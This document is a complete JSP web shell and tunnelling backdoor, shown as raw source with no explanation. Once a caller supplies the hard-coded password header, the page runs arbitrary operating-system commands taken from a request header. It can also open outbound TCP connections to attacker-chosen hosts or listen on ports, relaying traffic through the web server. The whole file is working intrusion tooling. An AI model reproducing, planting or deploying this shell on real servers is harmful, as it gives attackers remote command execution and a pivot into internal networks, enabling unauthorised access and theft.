<%@page import="java.lang.*"%><%@page import="java.util.*"%><%@page import="java.io.*"%><%@page import="java.net.*"%><% 

final String opType = request.getHeader("X-Type");
final int BUFSIZE = 4096;

class InputThread extends Thread 
{
	public boolean die = false;
	InputStream is; 
	OutputStream os; 
	
	Process targetProcess;
	Socket targetSock;
	ServerSocket serverSock;
	
	InputThread( InputStream is, OutputStream os, Process targetProcess, Socket targetSocket, ServerSocket serverSocket ) 
	{
		this.is = is;
		this.os = os;
		
		this.targetProcess = targetProcess;
		this.targetSock = targetSocket;
		this.serverSock = serverSocket;
	} 
	
	public void setOutputStream(OutputStream os)
	{
		this.os = os;
	}
	
	public void setTargetSock(Socket targetSock)
	{
		this.targetSock = targetSock;
	}
	
	public void run() { 
		try { 			
			byte buffer[] = new byte[BUFSIZE]; 
			int length;
			String checkbeat;
			
			while(!this.die && (( length = this.is.read( buffer, 0, buffer.length ) ) > 0))
			{ 
				checkbeat = new String(buffer, 0, length );
				if (!checkbeat.equals("((([[[(((HEARTBEAT)))]]])))"))
				{						
					this.os.write( buffer, 0, length ); 
					this.os.flush();
				}
			}
		} catch( Exception e )
		{}
		
		try {
			if ("X".equals(opType))
			{
				this.targetProcess.destroy();
			}
			else if ("C".equals(opType))
			{
				this.targetSock.close();
			}
		} catch ( Exception e )
		{}
		
		if ("L".equals(opType))
		{
			try {
				this.targetSock.close(); 
			} catch ( Exception e )
			{}
			
			try {
				this.serverSock.close(); 
			} catch ( Exception e )
			{}
		}
	}
}

if (!"Ddzq1Mg6rIJDCAj7ch78vl3ZEGcXnqKjs97gs5y".equals(request.getHeader("X-Pwd")))
{
	out.println("Invalid request\r\n");
	return;
}

response.setContentType("application/octet-stream");

OutputStream webOS = response.getOutputStream();
InputStream webIS = request.getInputStream();

// webOS.write("INIT\r\n".getBytes(), 0, 6);
webOS.write("INIT".getBytes(), 0, 4);
webOS.flush();

InputStream targetIS;
OutputStream targetOS;

ServerSocket serverSock = null;
Socket targetSock = null;
Process targetProcess = null;

InputThread threadInput = null;


if ("C".equals(opType))
{
	String targetIP = request.getHeader("X-Ip");
	String targetPort = request.getHeader("X-Port");
	
	try
	{
		targetSock = new Socket(targetIP, Integer.parseInt(targetPort));
		
		targetIS = targetSock.getInputStream();
		targetOS = targetSock.getOutputStream();
		
		threadInput	= new InputThread(webIS, targetOS, targetProcess, targetSock, serverSock);
		threadInput.start();
	}
	catch (Exception e)
	{
                String resp = "FAILED: " + e; //  + "\r\n";
		webOS.write(resp.getBytes(), 0, resp.length());
		// webOS.write("FAILED\r\n".getBytes(), 0, 8);
		webOS.flush();
		webOS.close();
		return;
	}
		
	// webOS.write("SUCCESS\r\n".getBytes(), 0, 9);
	webOS.write("SUCCESS".getBytes(), 0, 7);
	webOS.flush();		
}
else if ("L".equals(opType))
{
	String targetIP = request.getHeader("X-Ip");
	String targetPort = request.getHeader("X-Port");
	
	try
	{
		serverSock = new ServerSocket(Integer.parseInt(targetPort), 0, InetAddress.getByName(targetIP));
		
		threadInput	= new InputThread(webIS, null, targetProcess, targetSock, serverSock);
		threadInput.start();
		
		serverSock.setSoTimeout(30000);

		// webOS.write("LISTENING\r\n".getBytes(), 0, 11);
		webOS.write("LISTENING".getBytes(), 0, 9);
		webOS.flush();
		
		targetSock = serverSock.accept();
		serverSock.setSoTimeout(0);
		
		targetIS = targetSock.getInputStream();
		targetOS = targetSock.getOutputStream();
		
		threadInput.setOutputStream(targetOS);
		threadInput.setTargetSock(targetSock);
	}
	catch (Exception e)
	{
                String resp = "FAILED: " + e; // + "\r\n";
		webOS.write(resp.getBytes(), 0, resp.length());
		// webOS.write(("FAILED\r\n" + e).getBytes(), 0, 8);
		webOS.flush();
		webOS.close();
		return;
	}
		
	webOS.write("SUCCESS".getBytes(), 0, 7);
	webOS.flush();
}
else if ("X".equals(opType))
{
	String targetCommand = request.getHeader("X-Cmd");
	
	try
	{
		StringTokenizer st = new StringTokenizer(targetCommand);
        String[] cmdarray = new String[st.countTokens()];
        for (int i = 0; st.hasMoreTokens(); i++)
            cmdarray[i] = st.nextToken();
		
		ProcessBuilder pb = new ProcessBuilder(cmdarray);
		pb.redirectErrorStream(true);
		targetProcess = pb.start();
		
		targetIS = targetProcess.getInputStream();
		targetOS = targetProcess.getOutputStream();
		
		threadInput	= new InputThread(webIS, targetOS, targetProcess, targetSock, serverSock);
		threadInput.start();

	}
	
	catch (Exception e)
	{
                String resp = "FAILED: " + e; // + "\r\n";
		webOS.write(resp.getBytes(), 0, resp.length());
		// webOS.write("FAILED\r\n".getBytes(), 0, 8);
		webOS.flush();
		webOS.close();
		return;
	}
		
	// webOS.write("SUCCESS\r\n".getBytes(), 0, 9);
	webOS.write("SUCCESS\r\n".getBytes(), 0, 7);
	webOS.flush();	
}
else
{	
	// webOS.write("FAILED\r\n".getBytes(), 0, 8);
	webOS.write("FAILED".getBytes(), 0, 6);
	webOS.flush();
	webOS.close();
	return;
}



try {
	byte buffer[] = new byte[BUFSIZE]; 
	int length; 

	while(threadInput.isAlive() && (( length = targetIS.read( buffer, 0, buffer.length ) ) > 0 )) { 
		webOS.write( buffer, 0, length ); 
		webOS.flush();
	} 
} catch( Exception e )
{}

threadInput.die = true;

try {
	if ("X".equals(opType))
	{
		targetProcess.destroy();
	}
	else if ("C".equals(opType))
	{
		targetSock.close();
	}	
} catch ( Exception e )
{}

if ("L".equals(opType))
{
	try {
		targetSock.close(); 
	} catch ( Exception e )
	{}
	try {
		serverSock.close(); 
	} catch ( Exception e )
	{}
}
%>
